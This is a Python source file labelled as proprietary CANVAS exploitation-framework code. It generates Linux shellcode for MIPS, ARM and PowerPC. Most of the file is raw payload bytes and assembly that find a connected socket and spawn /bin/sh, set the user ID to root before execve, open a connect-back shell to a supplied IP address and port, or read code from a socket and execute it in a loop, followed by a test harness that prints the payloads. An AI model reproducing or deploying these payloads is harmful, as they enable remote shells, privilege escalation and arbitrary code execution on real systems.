#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from mosdef_shellcodeGenerator import nonMOSDEFShellcodeGenerator, shellcodeGenerator
from MOSDEF import mosdef, GetMOSDEFlibc
#from MOSDEF import GetMOSDEFlibc

class linux_mipsel(nonMOSDEFShellcodeGenerator):
    
    def __init__(self):
        shellcodeGenerator.__init__(self)
        #self.libc = GetMOSDEFlibc('Linux', 'mipsel')
        self.handlers["exit"]=self.exit
        self.handlers["GOFindSockWithShell"]=self.GOFindSockWithShell
    
    def exit(self, args):
        # _exit(?);
        code  = "\xa1\x0f\x02\x24"   # li      v0,SYS__exit
        code += "\x0c\x00\x00\x00"   # syscall
        self.value += code
        return code
    
    def GOFindSockWithShell(self, args):
        """ 202/260 bytes GOOOcode """
        
        code  = "\xc0\xfe\xbd\x27"   # addiu   sp,sp,-320
        code += "\x09\x00\x11\x24"   # li      s1,EBADF
        # findsocket();
        code += "\x00\x04\x04\x24"   # li      a0,1024	// start at 1024
        code += "\x08\x00\xa5\x27"   # addiu   a1,sp,8
        code += "\x04\x00\xa6\x27"   # addiu   a2,sp,4
        code += "\x80\x00\x10\x24"   # li      s0,128	// sizeof(struct sockaddr_storage)
        code += "\x04\x00\xb0\xaf"   # sw      s0,4(sp)
        code += "\x4b\x10\x02\x24"   # li      v0,SYS_getpeername
        code += "\x0c\x00\x00\x00"   # syscall
        code += "\x07\x00\x51\x10"   # beq     v0,s1,+32
        code += "\xff\x00\x6b\x35"   # ori     t3,t3,0xff
        code += "\x03\x00\x40\x14"   # bnez    v0,close_fds
        code += "\xff\x00\x6b\x35"   # ori     t3,t3,0xff
        code += "\x36\x01\xa4\xaf"   # sw      a0,310(sp)
        code += "\x02\x00\x00\x10"   # b       -12
        # close(badfd);
        code += "\xa6\x0f\x02\x24"   # li      v0,SYS_close
        code += "\x0c\x00\x00\x00"   # syscall
        code += "\xff\xff\x84\x24"   # addiu   a0,a0,-1
        code += "\xf3\xff\x81\x04"   # bgez    a0,-48
        code += "\xa4\x0f\x02\x24"   # li      v0,SYS_write
        code += "\x36\x01\xa4\x8f"   # lw      a0,310(sp)
        # write(sockfd, &"GOOO", 4);
        code += "\x4f\x4f\x05\x3c"   # lui     a1,0x4f4f
        code += "\x47\x4f\xa5\x34"   # ori     a1,a1,0x4f47
        code += "\x00\x00\xa5\xaf"   # sw      a1,0(sp)
        code += "\x00\x00\xa5\x27"   # addiu   a1,sp,0
        code += "\x04\x00\x06\x24"   # li      a2,4
        code += "\x0c\x00\x00\x00"   # syscall
        if args and "CleanSockOpt" in args:
            # setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, [NULL, NULL], 8);
            code += "\xff\xff\x05\x34"   # li      a1,SOL_SOCKET
            code += "\x06\x10\x06\x24"   # li      a2,SO_RCVTIMEO
            code += "\x20\x00\xa0\xaf"   # sw      zero,32(sp)
            code += "\x24\x00\xa0\xaf"   # sw      zero,36(sp)
            code += "\x20\x00\xa7\x27"   # addiu   a3,sp,32
            code += "\x08\x00\x12\x24"   # li      s2,8
            code += "\x10\x00\xb2\xaf"   # sw      s2,16(sp)
            code += "\x55\x10\x02\x24"   # li      v0,SYS_setsockopt
            code += "\x0c\x00\x00\x00"   # syscall
            # setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, [NULL, NULL], 8);
            code += "\x05\x10\x06\x24"   # li      a2,SO_SNDTIMEO
            code += "\x20\x00\xa7\x27"   # addiu   a3,sp,32
            code += "\x55\x10\x02\x24"   # li      v0,SYS_setsockopt
            code += "\x0c\x00\x00\x00"   # syscall
        # dup2(sockfd, [0,1,2]);
        code += "\x02\x00\x05\x24"   # li      a1,2
        code += "\x02\x00\xa4\x10"   # beq     a1,a0,+12
        code += "\xdf\x0f\x02\x24"   # li      v0,4063
        code += "\x0c\x00\x00\x00"   # syscall
        code += "\xfc\xff\xa0\x1c"   # bgtz    a1,-12
        code += "\xff\xff\xa5\x24"   # addiu   a1,a1,-1
        # close(sockfd);
        code += "\x03\x00\x85\x2c"   # sltiu   a1,a0,3
        code += "\x02\x00\xa0\x14"   # bnez    a1,execve
        code += "\xa6\x0f\x02\x24"   # li      v0,4006
        code += "\x0c\x00\x00\x00"   # syscall
        # execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
        code += "\x69\x6e\x04\x3c"   # lui     a0,0x6e69
        code += "\x2f\x62\x84\x34"   # ori     a0,a0,0x622f
        code += "\x00\x00\xa4\xaf"   # sw      a0,0(sp)
        code += "\x68\x00\x04\x3c"   # lui     a0,0x68
        code += "\x2f\x73\x84\x34"   # ori     a0,a0,0x732f
        code += "\x04\x00\xa4\xaf"   # sw      a0,4(sp)
        code += "\x00\x00\xa4\x27"   # addiu   a0,sp,0
        code += "\x08\x00\xa4\xaf"   # sw      a0,8(sp)
        code += "\x0c\x00\xa0\xaf"   # sw      zero,12(sp)
        code += "\x08\x00\xa5\x27"   # addiu   a1,sp,8
        code += "\x0c\x00\xa6\x27"   # addiu   a2,sp,12
        code += "\xab\x0f\x02\x24"   # li      v0,SYS_execve
        code += "\x0c\x00\x00\x00"   # syscall
        if args and "CleanExit" in args:
            # _exit(?);
            code += "\xa1\x0f\x02\x24"   # li      v0,SYS__exit
            code += "\x0c\x00\x00\x00"   # syscall
        self.value += code
        return code

class linux_armel(nonMOSDEFShellcodeGenerator):
    
    def __init__(self):
        shellcodeGenerator.__init__(self)
        #self.libc = GetMOSDEFlibc('Linux', 'armel')
        self.handlers["exit"]=self.exit
        self.handlers["setuid+execve"]=self.setuid_execve
    
    def exit(self, ignored):
        # _exit(?);
        return "\x01\x00\x90\xef"   # swi  0x00900001
    
    def setuid_execve(self, args = ["setgid"]):
        # setuid(0);
        code  = "\x00\x00\xa0\xe3"  # mov r0, #0		// arg0 = 0
        code += "\x17\x00\x90\xef"  # swi 0x00900017		// SYS_setuid()
        if args and "setgid" in args:
            # setgid(0);
            code += "\x00\x00\xa0\xe3"  # mov r0, #0		// arg0 = 0
            code += "\x2e\x00\x90\xef"  # swi 0x0090002e	// SYS_setgid()
        code += "\x07\x00\x00\xeb"  # bl getpc
        # pcloc:
        # execve("/bin/sh", ["/bin/sh", NULL], NULL);
        code += "\x08\xd0\x4d\xe2"  # sub sp, sp, #8		// sp -= 8
        code += "\x00\x20\xa0\xe3"  # mov r2, #0		// arg2 = NULL
        code += "\x00\x00\x8d\xe5"  # str r0, [sp]		// sp[0] = argv[0] = shell
        code += "\x04\x20\x8d\xe5"  # str r2, [sp, #4]		// sp[4] = argv[1] = NULL
        code += "\x00\x10\x8d\xe2"  # add r1, sp, #0		// arg1 = argv = sp[0]
        code += "\x04\x20\x8d\xe2"  # add r2, sp, #4		// arg2 = envp = sp[4]
        code += "\x0b\x00\x90\xef"  # swi 0x0090000b		// SYS_execve()
        # _exit(?);
        code += "\x01\x00\x90\xef"  # swi 0x00900001		// SYS_exit()
        # getpc:						// here we have pcloc in %lr
        code += "\x28\x00\x8e\xe2"  # add r0, lr, #48		// arg0 = "/bin/sh"
        code += "\xf5\xff\xff\xea"  # b pcloc
        code += "/bin/sh\x00"
        self.value += code
        return code

class linux_ppc(shellcodeGenerator):
    """ XXX: This will be broken right about now."""
    
    def __init__(self):
        shellcodeGenerator.__init__(self, "PPC")
        self.libc = GetMOSDEFlibc('Linux', 'ppc')
        self.handlers["trap"]=self.trap
        self.handlers["exit"]=self.exit
        self.handlers["execve"]=self.execve
        self.handlers["execve+exit"]=self.execve_exit
        self.handlers["setreuid+execve"]=self.setreuid_execve
        self.handlers["setreuid+execve+exit"]=self.setreuid_execve_exit
        self.handlers["GOOOFindSockWithShell"]=self.GOOOFindSockWithShell
        self.handlers["GOOOConnectBackWithShell"]=self.GOOOConnectBackWithShell
        self.handlers["read_exec"]=self.read_exec
        self.handlers["read_exec_loop"]=self.read_exec_loop
        self.handlers["sendreg"]=self.sendreg
    
    def trap(self, args_ignored):
        code = "\x7f\xe0\x00\x08"
        self.value += code
        return code
    
    def sendreg(self, args):
        # send a 32-Bit register
        fdreg = args['fdreg']
        code = """
            stwu r1, -8(r1)
            stw REGTOSEND, 4(r1)
            li r0, SYS_write
            mr r3, FDREG
            addi r4, r1, 4
            li r5, 4
            sc
            !lwz r1, 0(r1)
            addi r1, r1, 8
        """
        code = code.replace("FDREG", args["fdreg"])
        code = code.replace("REGTOSEND", args["regtosend"])
        code = self.libc.patch_defines_with_values(code, ["SYS_write"])
        return self.assemble(code)

    def exit(self, args_ignored):
        # _exit(?);
        code  = "\x38\x00\x00\x01"       # li r0, SYS__exit
        code += "\x44\x00\x00\x02"       # sc
        self.value += code
        return code
    
    def execve(self, args):
        """ 52 bytes execve(/bin/sh) without '\x00' null-byte """
        
        # execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
        code  = "\x7c\x63\x1a\x79"       # xor.    r3,r3,r3
        code += "\x90\x61\xff\xfc"       # stw     r3,-4(r1)
        code += "\x41\xa1\xff\xf9"       # bgtl-   <shellcode>
        code += "\x7d\xa8\x02\xa6"       # mflr    r13
        code += "\x39\xad\xfe\x46"       # addi    r13,r13,-442
        code += "\x88\x0d\x01\xd4"       # lbz     r0,468(r13)
        if args and "CleanExit" in args:
            code += "\x38\x6d\x01\xe2"   # addi    r3,r13,474+2*4
        else:
            code += "\x38\x6d\x01\xda"   # addi    r3,r13,474
        code += "\x38\xa1\xff\xfc"       # addi    r5,r1,-4
        code += "\x94\x61\xff\xf8"       # stwu    r3,-8(r1)
        code += "\x7c\x24\x0b\x78"       # mr      r4,r1
        code += "\x44\x05\x80\x02"       # sc
        if args and "CleanExit" in args:
            # _exit(?);
            code += "\x88\x0d\x01\xdc"   # lbz     r0,476(r13)
            code += "\x44\x03\x80\x02"   # sc
        code += "/bin/sh\x00"
        self.value += code
        return code

    def execve_exit(self, args):
        """ 60 bytes execve(/bin/sh)+_exit(?) without '\x00' null-byte """
        return self.execve(["CleanExit"])
    
    def setreuid_execve(self, args):
        """ 64 bytes setreuid(0,0)+execve(/bin/sh) without '\x00' null-byte """
        
        # setreuid(0, 0);
        code  = "\x7c\x63\x1a\x79"       # xor.    r3,r3,r3
        code += "\x90\x61\xff\xfc"       # stw     r3,-4(r1)
        code += "\x7c\x64\x1b\x78"       # mr      r4,r3
        code += "\x41\xa1\xff\xf5"       # bgtl-   <shellcode>
        code += "\x7d\xa8\x02\xa6"       # mflr    r13
        code += "\x39\xad\xfe\x46"       # addi    r13,r13,-442
        code += "\x88\x0d\x01\xc1"       # lbz     r0,449(r13)
        code += "\x44\x0c\x80\x02"       # sc
        # execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
        code += "\x88\x0d\x01\xdc"       # lbz     r0,476(r13)
        if args and "CleanExit" in args:
            code += "\x38\x6d\x01\xea"   # addi    r3,r13,482+2*4
        else:
            code += "\x38\x6d\x01\xe2"   # addi    r3,r13,482
        code += "\x38\xa1\xff\xfc"       # addi    r5,r1,-4
        code += "\x94\x61\xff\xf8"       # stwu    r3,-8(r1)
        code += "\x7c\x24\x0b\x78"       # mr      r4,r1
        code += "\x44\x05\x80\x02"       # sc
        if args and "CleanExit" in args:
            # _exit(?);
            code += "\x88\x0d\x01\xe4"   # lbz     r0,484(r13)
            code += "\x44\x03\x80\x02"   # sc
        code += "/bin/sh\x00"
        self.value += code
        return code
    
    def setreuid_execve_exit(self, args):
        """ 72 bytes setreuid(0,0)+execve(/bin/sh)+_exit(?) without '\x00' null-byte """
        return self.setreuid_execve(["CleanExit"])
    
    def GOOOFindSockWithShell(self, args):
        """ 280|296 bytes GOOOcode """
        
        code  = "\x94\x21\xff\xd0"   # stwu r1,-48(r1)
        if args and "setreuid" in args:
            # setreuid(0, 0);
            code += "\x38\x00\x00\x46"   # li r0,70
            code += "\x38\x60\x00\x00"   # li r3,0
            code += "\x7c\x64\x1b\x78"   # mr r4,r3
            code += "\x44\x00\x00\x02"   # sc 
        code += "\x4c\xe7\x3a\x42"   # crset 4*cr1+so
        code += "\x41\xa7\x00\x19"   # bsol+ cr1,100000a4 <.start>
        # close(fd);
        code += "\x38\x00\x00\x06"   # li r0,6
        code += "\x44\x00\x00\x02"   # sc 
        code += "\x90\x61\xff\xfc"   # stw r3,-4(r1)
        code += "\x4e\x80\x00\x20"   # blr 
        # magic:
        code += "\x47\x4f\x4f\x4f"
        code += "\x7d\xa8\x02\xa6"   # mflr r13
        # getpeername(fd, sa = [128], &salen = 128);
        code += "\x3b\x80\xff\xff"   # li r28,-1
        code += "\x3b\xe0\x04\x00"   # li r31,1024
        code += "\x38\x00\x00\x80"   # li r0,128
        code += "\x90\x01\x00\x0c"   # stw r0,12(r1)
        code += "\x38\x81\x00\x28"   # addi r4,r1,40
        code += "\x38\xa1\x00\x0c"   # addi r5,r1,12
        code += "\x93\xe1\x00\x14"   # stw r31,20(r1)
        code += "\x90\x81\x00\x18"   # stw r4,24(r1)
        code += "\x90\xa1\x00\x1c"   # stw r5,28(r1)
        code += "\x38\x81\x00\x14"   # addi r4,r1,20
        code += "\x38\x60\x00\x07"   # li r3,7
        code += "\x38\x00\x00\x66"   # li r0,102
        code += "\x44\x00\x00\x02"   # sc 
        code += "\x2e\x1c\xff\xff"   # cmpwi cr4,r28,-1
        code += "\x2c\x03\x00\x00"   # cmpwi r3,0
        code += "\x40\xa2\x00\x14"   # bne+ 100000f8 <.getpeername_failed>
        code += "\x7f\xe3\xfb\x78"   # mr r3,r31
        code += "\x40\x92\xff\xa5"   # bnel+ cr4,10000090 <close>
        code += "\x41\x92\x00\x30"   # beq- cr4,10000120 <.loop1_foundfd>
        code += "\x48\x00\x00\x18"   # b 1000010c <.loop1_end>
        code += "\x2f\x83\x00\x58"   # cmpwi cr7,r3,88
        code += "\x2f\x03\x00\x6b"   # cmpwi cr6,r3,107
        code += "\x7f\xe3\xfb\x78"   # mr r3,r31
        code += "\x41\x9e\xff\x8d"   # beql+ cr7,10000090 <close>
        code += "\x41\x9a\xff\x89"   # beql+ cr6,10000090 <close>
        code += "\x2f\x9f\x00\x00"   # cmpwi cr7,r31,0
        code += "\x60\x00\x00\x00"   # nop 
        code += "\x3b\xff\xff\xff"   # addi r31,r31,-1
        code += "\x40\xbe\xff\x98"   # bne- cr7,100000b0 <getpeername>
        code += "\x48\x00\x00\x0c"   # b 10000128 <.loop1_out>
        code += "\x7f\xfc\xfb\x78"   # mr r28,r31
        code += "\x4b\xff\xff\xe8"   # b 1000010c <.loop1_end>
        code += "\x40\xb2\x00\x0c"   # bne+ cr4,10000134 <.no_exit>
        # exit(?);
        code += "\x38\x00\x00\x01"   # li r0,1
        code += "\x44\x00\x00\x02"   # sc 
        # write(fd, "GOOO", 4);
        code += "\x7f\x83\xe3\x78"   # mr r3,r28
        code += "\x38\x8d\x00\x10"   # addi r4,r13,16
        code += "\x38\xa0\x00\x04"   # li r5,4
        code += "\x38\x00\x00\x04"   # li r0,4
        code += "\x44\x00\x00\x02"   # sc 
        # // fd in $r28

        if args and "execshell" in args:
            # dup2(fd, [0,1,2]);
            code += "\x3b\xe0\x00\x02"   # li r31,2
            code += "\x7f\x9c\xf8\x00"   # cmpw cr7,r28,r31
            code += "\x41\x9e\x00\x14"   # beq- cr7,10000164 <.dup2_nextfd>
            code += "\x7f\x83\xe3\x78"   # mr r3,r28
            code += "\x7f\xe4\xfb\x78"   # mr r4,r31
            code += "\x38\x00\x00\x3f"   # li r0,63
            code += "\x44\x00\x00\x02"   # sc 
            code += "\x2f\x9f\x00\x00"   # cmpwi cr7,r31,0
            code += "\x3b\xff\xff\xff"   # addi r31,r31,-1
            code += "\x40\x9e\xff\xe0"   # bne+ cr7,1000014c <.dup2_loop>
            code += "\x2f\x9c\x00\x02"   # cmpwi cr7,r28,2
            code += "\x7f\x83\xe3\x78"   # mr r3,r28
            code += "\x41\xbd\xff\x19"   # bgtl- cr7, <close>
            # execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
            code += "\x38\x00\x00\x0b"   # li r0, 11
            code += "\x38\x6d\x01\x04"   # addi r3, r13, 260
            code += "\x90\x61\xff\xf8"   # stw r3, -8(r1)
            code += "\x38\x81\xff\xf8"   # addi r4, r1, -8
            code += "\x38\xa1\xff\xfc"   # addi r5, r1, -4
            code += "\x44\x00\x00\x02"   # sc 
            # _bin_sh:
            code += "/bin/sh\x00"
        else:
            code += "\x38\x21\x00\x30"   # addi r1, r1, 48
            #code += "\x80\x21\xff\xd0"   # lwz r1, -48(r1)
        self.value += code
        return code
    
    def GOOOConnectBackWithShell(self, args):
        """ ? bytes GOOOcode """
        
        import struct, socket
        if not "magic" in args:
            args['magic'] = "GOOO"
        code  = "\x94\x21\xff\xb0"
        if "setreuid" in args:
            code += "\x38\x80\x00\x00"
            code += "\x38\x60\x00\x00"
            code += "\x38\x00\x00\x46"
            code += "\x44\x00\x00\x02"
        code += "\x42\x9f\x00\x21"
        code += "\x90\x81\x00\x14"
        code += "\x90\xa1\x00\x18"
        code += "\x90\xc1\x00\x1c"
        code += "\x38\x81\x00\x14"
        code += "\x38\x00\x00\x66"
        code += "\x44\x00\x00\x02"
        code += "\x4e\x80\x00\x20"
        code += "\x7d\xa8\x02\xa6"
        code += "\x3b\x80\x03\xff"
        code += "\x7f\x83\xe3\x78"
        code += "\x38\x00\x00\x06"
        code += "\x44\x00\x00\x02"
        code += "\x37\x9c\xff\xff"
        code += "\x40\x80\xff\xf0"
        code += "\x38\x80\x00\x02"
        code += "\x38\xa0\x00\x01"
        code += "\x38\xc0\x00\x06"
        code += "\x38\x60\x00\x01"
        code += "\x4b\xff\xff\xb9"
        code += "\x38\x80\x00\x00"
        code += "\x38\xad\x00\xb0"
        code += "\x38\xc0\x00\x10"
        code += "\x38\x60\x00\x03"
        code += "\x4b\xff\xff\xa5"
        code += "\x38\x60\x00\x00"
        code += "\x38\x8d\x00\xb8"
        code += "\x38\xa0\x00\x04"
        code += "\x38\x00\x00\x04"
        code += "\x44\x00\x00\x02"
        code += "\x3b\x83\xff\xfe"
        code += "\x37\x9c\xff\xff"
        code += "\x38\x9c\x00\x01"
        code += "\x38\x60\x00\x00"
        code += "\x38\x00\x00\x3f"
        code += "\x44\x00\x00\x02"
        code += "\x41\x81\xff\xec"
        code += "\x38\x6d\x00\xa8"
        code += "\x90\x61\xff\xf8"
        code += "\x38\x81\xff\xf8"
        code += "\x38\xa1\xff\xfc"
        code += "\x38\x00\x00\x0b"
        code += "\x44\x00\x00\x02"
        code += "/bin/sh\x00\x00\x02"
        code += struct.pack(">H", int(args['port']))
        code += socket.inet_aton(socket.gethostbyname(args['ipaddress']))
        code += args['magic'][:4]
        self.value += code
        return code
    
    def read_exec(self, args, use_mmap = False, L1CACHESIZE = 8*1024):
        # http://developer.apple.com/documentation/DeveloperTools/Conceptual/LowLevelABI/Articles/32bitPowerPC.html#//apple_ref/doc/uid/TP40002438-SW17
        #  check http://www.cpu-collection.de/?l0=co&l1=IBM&l2=PowerPC for L1 cache size

        assert not L1CACHESIZE % 1024, "L1 Cache MUST be 1K aligned!"
        if args == None: # if called from __main__
            args = {'fdval': 666}
        if 'fdval' in args.keys():
            pattern = "li r3, FDVAL\n".replace("FDVAL", str(args["fdval"]))
        else:
            pattern = "mr r3, FDREG\n".replace("FDREG", args["fdreg"])
        code = """
        ! stack alloc XXX 12 = 4(ra) + 4(fd) + 4(sz)
            stwu r1, -0x1000(r1)
            """
        
        if use_mmap or True:
            import math
            l1bitshift = 31 - int(math.log(L1CACHESIZE, 2))
            l1bitmask = L1CACHESIZE - 1
            codecache = ""
            #codecache = """

            code += """
        read_exec_loop:

            ! depending of L1 cache
        ! mmap(0, 0x10000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            li  r0, 90
            li  r3, 0
            lis r4, 1
            li  r5, 7
            li  r6, 0x22
            li  r7, -1
            li  r8, 0
            sc
            bso- mmap_failed
            cmpwi r3, -1
            beq- mmap_failed
            stw r3, 16(r1)
            """
        
        code += """

! XXX: changed to jmp to mmap at start of loop           
!      read_exec_loop:

        ! e = read(fd, &size, 4);
            li r0, SYS_read
            PATTERN_set_fd_in_r3
            addi r4, r1, 12
            li r5, 4
            sc
            bso- read_failed
        ! if (e != 4) exit();
            cmpwi r3, 4
            bne- read_failed
            
            """
        
        if use_mmap:
            code += """
            lwz r14, 16(r1) ! addr
            lwz r13, 12(r1) ! size
            mtlr r14
        ! e = read(fd, &buf, size);
        read_more:
            PATTERN_set_fd_in_r3
            li r0, SYS_read
            mr r4, r14
            mr r5, r13
            sc
        ! if (e <= 0) exit();
            bso- read_failed
            cmpwi r3, 0
            ble- read_failed
            subfc. r13, r3, r13
            add r14, r14, r3
            bgt- read_more
            """
        else:
            code += """
        ! e = read(fd, &buf, size);
            PATTERN_set_fd_in_r3
            lwz r5,12(r1)
            addi r4, r1, 16
            mtlr r4
            li r0, SYS_read
            sc
            bso- read_failed
        ! if (e <= 0) exit();
            cmpwi r3,0
            ble- read_failed
            """

        codecache += """
        ! depending of L1 cache (16K)
        ! check http://www.cpu-collection.de/?l0=co&l1=IBM&l2=PowerPC

        ! XXX: I don't think all PPC out there support these cache instructions ..
        ! XXX: can we do a noir-style branch-nop overwrite flush ???

            mflr r30
            rlwinm r31, r30, 0, 0, L1SHIFT   ! addr & ~(L1CACHESIZE - 1)
            lwz r29, 12(r1)
            add r0, r30, r29
            ori r0, r0, L1MASK           ! (addr + size) | (L1CACHESIZE - 1)
        
        update_cache:
            dcbf r0, r31
            sync                        ! flush
            icbi r0, r31
            addi r31, r31, L1MASK
            cmpw r31, r0
            ble+ update_cache
            isync                       ! before use the code
            
            """
        codecache = codecache.replace("L1SHIFT", str(l1bitshift))
        codecache = codecache.replace("L1MASK", str(l1bitmask))
        code += codecache
        
        code += """
        ! restore stack and jump to $lr=buf
            !lwz r1, 0(r1)
            blrl

        ! munmap and loop back
            li  r0, 91
            lwz r3, 16(r1)
            lis r4, 1
            sc

            b read_exec_loop
        mmap_failed:
        read_failed:
            li r0, SYS__exit
            sc
        """

        code = code.replace("PATTERN_set_fd_in_r3", pattern)
        code = self.libc.patch_defines_with_values(code, ["SYS_read", "SYS__exit"])
        return self.assemble(code)
    
    def read_exec_loop(self, args):
        return self.read_exec(args, use_mmap = True)


if __name__=="__main__":
    
    from exploitutils import *
    import shellcodeGenerator
    
    def test_shellcode(procname, shellcodename, shellcodeargs = None):
        try:
            shellcodegen = getattr(shellcodeGenerator, 'linux_' + procname)
        except:
            return
        shellcodegen = shellcodegen()
        shellcodegen.addAttr(shellcodename, shellcodeargs)
        shellcode = shellcodegen.get()
        if shellcodeargs:
            shellcodeargs = " " + str(shellcodeargs)
        else:
            shellcodeargs = ""
        print "- %s%s length:%d" % (shellcodename, shellcodeargs, len(shellcode))
        print shellcode_dump(shellcode, mode="RISC")
    
    #########
    #
    # mipsel
    #
    #########
    
    print "testing Linux/mipsel ..."
    
    test_shellcode("mipsel", "GOFindSockWithShell")
    test_shellcode("mipsel", "GOFindSockWithShell", ["CleanSockOpt"])
    
    print "Linux/mipsel tests done.\n"
    
    #########
    #
    # armel
    #
    #########
    
    print "testing Linux/armel ..."
    
    test_shellcode("armel", "setuid+execve")
    
    print "Linux/armel tests done.\n"
    
    #########
    #
    #  ppc
    #
    #########
    
    print "testing Linux/ppc ..."
    
    test_shellcode("ppc", "execve")
    test_shellcode("ppc", "execve+exit")
    test_shellcode("ppc", "setreuid+execve")
    test_shellcode("ppc", "setreuid+execve+exit")
    test_shellcode("ppc", "GOOOFindSockWithShell")
    test_shellcode("ppc", "read_exec")
    test_shellcode("ppc", "read_exec_loop")
    
    print "Linux/ppc tests done."

